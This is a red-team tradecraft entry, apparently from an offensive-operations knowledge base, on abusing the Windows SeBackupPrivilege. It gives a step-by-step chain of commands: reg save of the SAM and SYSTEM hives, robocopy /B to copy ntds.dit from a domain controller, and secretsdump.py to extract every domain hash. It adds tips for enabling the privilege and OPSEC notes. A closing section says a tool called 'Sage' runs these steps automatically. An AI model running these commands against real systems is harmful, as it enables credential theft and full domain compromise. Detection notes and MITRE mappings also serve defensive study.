---
name: SeBackupPrivilege Abuse
category: credential-access
subcategories: [privilege-abuse, ntds-extraction, sam-dump]
tradecraft_tags: [sebackupprivilege, ntds, sam, system, privilege, technique]
mitre_attack:
  - id: T1003.003
    name: OS Credential Dumping — NTDS
  - id: T1003.002
    name: OS Credential Dumping — Security Account Manager
source:
  url: https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  SeBackupPrivilege allows reading any file regardless of ACL — file reads with the
  backup FLAG set are visible in Sysmon and Windows Security audit if file auditing
  is configured. ntds.dit access from a non-SYSTEM process is a strong EDR signal.
  Sysmon event 9 (RawAccessRead) for ntds.dit direct access.
usage_examples:
  - description: Use SeBackupPrivilege to dump SAM/SYSTEM hive (built-in reg.exe)
    args: "reg save HKLM\\SAM C:\\Windows\\Temp\\SAM && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM"
  - description: Copy ntds.dit using robocopy (backup semantics)
    args: "robocopy /B C:\\Windows\\NTDS C:\\Windows\\Temp ntds.dit"
  - description: Parse with secretsdump.py on Linux
    args: "secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL"
  - description: Check for SeBackupPrivilege in current token
    args: "(SharpUp TokenPrivileges check) whoami /priv | findstr SeBackupPrivilege"
opsec_notes: |
  SeBackupPrivilege is commonly granted to Backup Operators group members. It's a
  high-value privilege that's often overlooked. If SharpUp or Seatbelt shows
  SeBackupPrivilege in the current token, SAM/SYSTEM dump is immediately achievable
  on the current machine. On a DC, ntds.dit backup gives all domain hashes. Robocopy
  with /B flag uses backup semantics to bypass ACL restrictions.
gotchas: |
  Privilege must be ENABLED in the token — it may be present but disabled. Enable with:
  `(New-Object -TypeName AdjPriv).EnablePrivilege("SeBackupPrivilege")` or tools that
  call AdjustTokenPrivileges(). On modern Windows, SeBackupPrivilege alone doesn't allow
  direct ntds.dit copy while the database is in use by Active Directory — use shadow copy
  (vssadmin) or the robocopy /B approach against the NTDS directory. The SAM approach
  works directly since SAM is not locked by another process.
related_ttps: [shadow-copy-ntds, impacket-secretsdump, seatbelt, sharpup]
alternatives: [shadow-copy-ntds, dcsync-apollo]
common_args: {}
last_updated: 2026-05-29
---

# SeBackupPrivilege Abuse

Exploitation of the `SeBackupPrivilege` Windows privilege to bypass file ACLs and read
sensitive files (SAM, SYSTEM registry hives, ntds.dit). Processes with this privilege
can open any file for backup regardless of NTFS ACL settings. SharpUp and Seatbelt's
TokenPrivileges check identify when this privilege is present in the current token.

## The Exploitation Chain

```
1. Verify privilege: whoami /priv | findstr SeBackupPrivilege (must show "Enabled")
2. For local SAM (any machine with SeBackupPrivilege):
   reg save HKLM\SAM C:\Windows\Temp\SAM
   reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
   → Transfer to attacker machine → secretsdump.py -sam SAM -system SYSTEM LOCAL

3. For NTDS (DC with SeBackupPrivilege):
   robocopy /B C:\Windows\NTDS C:\Windows\Temp ntds.dit
   reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
   → secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

## Who has SeBackupPrivilege?
- Backup Operators group members (Windows default)
- WSUS Administrators (some configurations)
- Exchange SYSTEM groups (legacy Exchange)
- Users explicitly granted the right via Group Policy

## Typical use cases
- SYSTEM-equivalent credential access on current machine without needing SYSTEM token
- DC database extraction if SeBackupPrivilege is held on a DC

## How Sage uses this
Seatbelt's TokenPrivileges check and SharpUp identify this privilege. If present, Sage
uses `reg save` for SAM/SYSTEM and robocopy /B for ntds.dit — all via built-in Windows
tools (no binary upload needed).
